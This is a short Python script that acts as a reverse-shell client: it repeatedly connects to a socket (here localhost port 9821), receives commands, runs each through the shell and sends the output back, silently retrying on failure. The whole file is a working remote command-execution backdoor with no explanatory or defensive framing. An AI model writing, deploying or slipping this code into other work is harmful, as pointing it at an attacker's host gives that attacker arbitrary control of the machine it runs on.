import socket
import subprocess as sp
import time
while True:
    try:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('localhost', 9821))
        while True:
            command=sock.recv(4096).decode('utf-8')
            result=sp.run(command, shell=True, capture_output=True, text=True)
            sock.send(result.stdout.encode('utf-8'))
    except:
        time.sleep(2)